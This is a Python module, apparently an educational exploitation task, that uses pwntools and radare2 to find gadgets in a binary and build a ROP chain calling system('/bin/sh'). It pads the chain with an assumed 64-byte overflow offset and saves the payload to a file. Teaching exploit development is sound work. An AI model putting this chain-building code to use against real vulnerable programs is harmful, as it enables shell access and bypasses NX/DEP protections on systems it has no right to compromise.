#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ROP Chain Builder Task - Advanced pf Task

This task demonstrates building ROP (Return Oriented Programming) chains
using pwntools and radare2 integration for advanced exploitation.
"""

import sys
import os

# Add the MSF Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib', 'msf', 'core', 'modules', 'external', 'python'))

from metasploit.pf_task import (
    TaskMetadata, TaskCategory, SkillLevel, 
    run_pf_task, setup_pwntools_context, create_educational_content
)

# Task metadata
task_metadata = TaskMetadata(
    name="ROP Chain Builder",
    description="""
    Advanced exploitation technique using Return Oriented Programming (ROP).
    Learn to build ROP chains using pwntools and radare2 for binary analysis.
    Bypass modern exploit mitigations like NX/DEP.
    """,
    authors=["pf Team"],
    category=TaskCategory.EXPLOIT,
    skill_level=SkillLevel.ADVANCED,
    date="2024-01-15",
    tools_required=["pwntools", "radare2", "gdb"],
    educational_objectives=[
        "Understand Return Oriented Programming concepts",
        "Learn to find ROP gadgets in binaries",
        "Build functional ROP chains with pwntools",
        "Bypass NX/DEP protections",
        "Integrate multiple tools for exploit development"
    ],
    prerequisites=[
        "Understanding of buffer overflows",
        "Assembly language knowledge",
        "Familiarity with calling conventions",
        "Basic pwntools experience"
    ],
    estimated_time="30-45 minutes",
    difficulty_rating=4,
    options={
        'target_binary': {
            'type': 'string',
            'description': 'Path to target binary',
            'required': True,
            'default': '/bin/ls'
        },
        'target_function': {
            'type': 'string',
            'description': 'Target function to call (e.g., system)',
            'required': False,
            'default': 'system'
        },
        'target_arg': {
            'type': 'string',
            'description': 'Argument for target function',
            'required': False,
            'default': '/bin/sh'
        },
        'use_radare': {
            'type': 'bool',
            'description': 'Use radare2 for gadget discovery',
            'required': False,
            'default': True
        },
        'gadget_depth': {
            'type': 'int',
            'description': 'Maximum gadget instruction depth',
            'required': False,
            'default': 5
        }
    },
    env_vars={
        'PF_ROP_CACHE': '/tmp/rop_cache',
        'PF_GADGET_DEPTH': '5'
    }
)

def provide_education(args):
    """Provide educational content for ROP chains"""
    
    concepts = [
        "ROP uses existing code snippets (gadgets) ending in 'ret'",
        "Gadgets can be chained to perform arbitrary computations",
        "ROP bypasses NX/DEP by using existing executable code",
        "Common gadgets: pop/ret, mov/ret, arithmetic operations",
        "ROP chains require careful stack layout planning"
    ]
    
    steps = [
        "Analyze target binary for available gadgets",
        "Identify useful gadgets for our objective",
        "Plan the ROP chain execution flow",
        "Build the chain with proper stack layout",
        "Test and debug the ROP chain"
    ]
    
    return create_educational_content(
        task_metadata.educational_objectives,
        concepts,
        steps
    )

def find_gadgets_with_radare(binary_path, tools):
    """Find ROP gadgets using radare2"""
    
    if 'radare2' not in tools:
        return []
        
    radare = tools['radare2']
    
    try:
        if not radare.initialize(binary_path):
            return []
            
        # Use radare2 to find ROP gadgets
        gadgets_raw = radare.r2.cmd('/R')  # Find ROP gadgets
        
        gadgets = []
        for line in gadgets_raw.split('\n'):
            if line.strip() and 'ret' in line:
                parts = line.split()
                if len(parts) >= 2:
                    addr = parts[0]
                    instructions = ' '.join(parts[1:])
                    gadgets.append({
                        'address': addr,
                        'instructions': instructions
                    })
                    
        return gadgets[:50]  # Limit to first 50 gadgets
        
    except Exception as e:
        log.error(f"Radare2 gadget search failed: {e}")
        return []

def main_task(args, tools):
    """Main ROP chain building task"""
    
    try:
        from pwn import *
    except ImportError:
        log.error("pwntools not available")
        return False
        
    target_binary = args.get('target_binary')
    target_function = args.get('target_function', 'system')
    target_arg = args.get('target_arg', '/bin/sh')
    use_radare = args.get('use_radare', True)
    
    log.info(f"Building ROP chain for {target_binary}")
    
    # Step 1: Analyze the binary
    log.info("Step 1: Analyzing target binary...")
    
    try:
        elf = ELF(target_binary)
        context.binary = elf
        
        log.info(f"Architecture: {elf.arch}")
        log.info(f"Bits: {elf.bits}")
        log.info(f"Endian: {elf.endian}")
        log.info(f"PIE: {elf.pie}")
        log.info(f"NX: {elf.nx}")
        
        if not elf.nx:
            log.warning("NX is disabled - ROP may not be necessary")
        else:
            log.info("NX is enabled - ROP is appropriate")
            
    except Exception as e:
        log.error(f"Binary analysis failed: {e}")
        return False
    
    # Step 2: Find ROP gadgets
    log.info("Step 2: Finding ROP gadgets...")
    
    gadgets_found = []
    
    if use_radare and 'radare2' in tools:
        log.info("Using radare2 for gadget discovery...")
        gadgets_found = find_gadgets_with_radare(target_binary, tools)
        
        if gadgets_found:
            log.success(f"Found {len(gadgets_found)} gadgets with radare2")
            for i, gadget in enumerate(gadgets_found[:5]):  # Show first 5
                log.info(f"  {gadget['address']}: {gadget['instructions']}")
        else:
            log.warning("No gadgets found with radare2")
    
    # Also use pwntools ROP functionality
    log.info("Using pwntools for ROP chain building...")
    
    try:
        rop = ROP(elf)
        log.info(f"pwntools found {len(rop.gadgets)} gadgets")
        
        # Show some available gadgets
        if rop.gadgets:
            log.info("Sample gadgets from pwntools:")
            for addr, gadget in list(rop.gadgets.items())[:5]:
                log.info(f"  0x{addr:x}: {gadget}")
                
    except Exception as e:
        log.error(f"pwntools ROP initialization failed: {e}")
        return False
    
    # Step 3: Build ROP chain
    log.info("Step 3: Building ROP chain...")
    
    try:
        # Check if target function is available
        if target_function in elf.symbols:
            target_addr = elf.symbols[target_function]
            log.info(f"Found {target_function} at 0x{target_addr:x}")
        elif target_function in elf.plt:
            target_addr = elf.plt[target_function]
            log.info(f"Found {target_function} in PLT at 0x{target_addr:x}")
        else:
            log.warning(f"{target_function} not found in binary")
            # For demonstration, use a generic approach
            target_addr = 0x41414141  # Placeholder
            
        # Build the ROP chain
        if target_function == 'system':
            # Try to build system("/bin/sh") ROP chain
            try:
                # Find "/bin/sh" string
                binsh_addr = next(elf.search(b'/bin/sh'))
                log.info(f"Found '/bin/sh' at 0x{binsh_addr:x}")
                
                # Build ROP chain: system("/bin/sh")
                rop_chain = ROP(elf)
                rop_chain.call(target_addr, [binsh_addr])
                
                log.success("Built ROP chain for system('/bin/sh')")
                log.info(f"ROP chain length: {len(rop_chain.chain)} bytes")
                
                # Display the ROP chain
                log.info("ROP chain contents:")
                print(rop_chain.dump())
                
            except StopIteration:
                log.warning("'/bin/sh' string not found in binary")
                # Create a simpler demonstration chain
                rop_chain = ROP(elf)
                log.info("Created basic ROP chain structure")
                
        else:
            # Generic ROP chain building
            rop_chain = ROP(elf)
            log.info(f"Created ROP chain for {target_function}")
            
    except Exception as e:
        log.error(f"ROP chain building failed: {e}")
        return False
    
    # Step 4: Demonstrate ROP chain usage
    log.info("Step 4: Demonstrating ROP chain usage...")
    
    try:
        # Create a sample exploit payload
        offset = 64  # Assumed buffer overflow offset
        
        payload = b'A' * offset  # Padding to reach return address
        payload += rop_chain.chain  # ROP chain
        
        log.info(f"Complete exploit payload length: {len(payload)} bytes")
        log.info("Payload structure:")
        log.info(f"  - Padding: {offset} bytes")
        log.info(f"  - ROP chain: {len(rop_chain.chain)} bytes")
        
        # Save payload to file for analysis
        payload_file = '/tmp/rop_payload.bin'
        with open(payload_file, 'wb') as f:
            f.write(payload)
        log.info(f"Saved payload to {payload_file}")
        
    except Exception as e:
        log.error(f"Payload creation failed: {e}")
        return False
    
    # Step 5: Analysis and educational summary
    log.info("Step 5: ROP chain analysis...")
    
    log.success("ROP chain building task completed!")
    
    log.info("Key concepts demonstrated:")
    log.info("  • Binary analysis for gadget discovery")
    log.info("  • ROP chain construction with pwntools")
    log.info("  • Integration of multiple analysis tools")
    log.info("  • Bypass techniques for NX/DEP protection")
    
    log.info("Advanced techniques to explore:")
    log.info("  • JOP (Jump Oriented Programming)")
    log.info("  • SROP (Sigreturn Oriented Programming)")
    log.info("  • Blind ROP techniques")
    log.info("  • ROP chain optimization")
    
    return True

if __name__ == '__main__':
    run_pf_task(task_metadata, main_task, provide_education)